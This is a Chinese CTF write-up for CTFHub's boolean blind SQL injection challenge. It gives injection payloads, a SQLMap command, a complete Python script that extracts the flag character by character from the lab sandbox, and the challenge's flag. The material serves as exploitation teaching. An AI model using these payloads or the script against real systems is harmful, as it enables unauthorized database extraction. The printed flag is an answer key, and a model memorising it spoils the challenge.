---
title: CTFHub-SQL注入-布尔盲注 Writeup
date: 2026-09-28
category: web
tags: [CTFHub, SQL注入, 布尔盲注]
---
## 题目背景与原理

· 题目名称：SQL布尔盲注
· 题目特点：页面既不回显数据库的数据，也不回显详细的 SQL 报错信息。只有一个输入框，输入后页面只会告诉你“查询成功（query_success）”或“查询失败（空白/报错）”。
· 核心原理：布尔盲注就像蒙着眼睛玩“猜谜游戏”。黑客通过构造 真/假（True/False）的 SQL 条件，利用页面状态的差异，一个字符一个字符地猜出数据库里的内容。通常配合 substr() 截取字符和 ascii() 转换 ASCII 码，采用二分法进行猜解。

## 漏洞验证

1. 测试闭合方式：输入 ?id=1 and 1=1，页面显示 query_success。输入 ?id=1 and 1=2，页面无反应/报错。
2. 判断注入类型：页面没有加单引号的语法错误，说明是整数型注入（不需要加 ' 闭合）。
3. 测试盲注通道是否畅通：
   输入 ?id=1 and (select ascii(substr(database(),1,1))) > 100。
   预期现象：页面返回 query_success。
   结论：漏洞存在，且我们可以利用“页面返回 query_success 代表 True，不返回代表 False”这一特征，进行后续的自动化猜解。

## 实操踩坑记录与解决方案

❌ 踩坑记录：SQLMap 默认命令翻车

· 操作：使用命令 python -m sqlmap -u "http://.../?id=1" --technique B --batch --dbs
· 现象：SQLMap 跑了几个测试后报错：[CRITICAL] all tested parameters do not appear to be injectable，称参数不可注入。
· 原因分析：SQLMap 默认是根据响应内容的长短或 HTTP 状态码来判断真假的。由于靶场环境网络延迟、页面特征不明显等原因，SQLMap 没识别出 query_success 这个字符串就是“True”的特征，于是判定失败。
· 解决方案：
  · 方案 B（强烈推荐）：放弃 SQLMap，使用 Python 脚本。因为布尔盲注是极为耗时的操作，用 Python 写死脚本直接针对 Flag 表进行爆破，速度远超 SQLMap 的全盘扫库。
## 终极解题实战（Python 脚本自动化）

### 第一步：环境准备

确保电脑已安装 Python（当前环境为 Python 3.14.7）。
在命令行（CMD）中安装 requests 库：

```bash
pip install requests
```

### 第二步：编写自动化盲注脚本

在桌面新建 solve.py，将以下代码复制进去（注意把 url 替换成你当前环境最新的沙盒地址，因为环境重启后地址会变）：

```python
import requests

# ⚠️ 替换为你最新的靶场URL
url = "http://challenge-8aa5520f638268a7.sandbox.ctfhub.com:10800/"

# 字符集（包含数字、大小写字母和常见符号，可根据需要缩减）
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_-"

flag = ""

print("[*] 开始盲注爆破，请保持网络畅通...")

# 假设 Flag 长度最多 50 位
for i in range(1, 51):
    found = False
    for char in chars:
        # 构造 payload：比较当前位的 ASCII 码是否等于尝试字符的 ASCII 码
        payload = f"?id=1 and (select ascii(substr((select flag from flag),{i},1))) = {ord(char)}"
        
        try:
            # 发送请求，超时设为 3 秒
            r = requests.get(url + payload, timeout=3)
            
            # 如果页面包含 query_success，说明猜对了
            if "query_success" in r.text:
                flag += char
                print(f"[+] 找到第 {i} 位: {char}  当前结果: {flag}")
                found = True
                break
        except Exception:
            # 忽略网络波动，继续跑
            pass
    
    # 如果某一位遍历完所有字符都没匹配上，说明 Flag 提取完毕
    if not found:
        break

print(f"\n[🎉] 最终 Flag 是: {flag}")
```
### 第三步：运行脚本获取 Flag

在命令行中切换到脚本所在目录（如桌面 cd Desktop），执行：

```bash
python solve.py
```

脚本会逐位打印出猜解的字符，最终拼接出 ctfhub{...} 格式的完整 Flag。

## Flag
ctfhub{55420edcc3d3e0f77fe0702c}
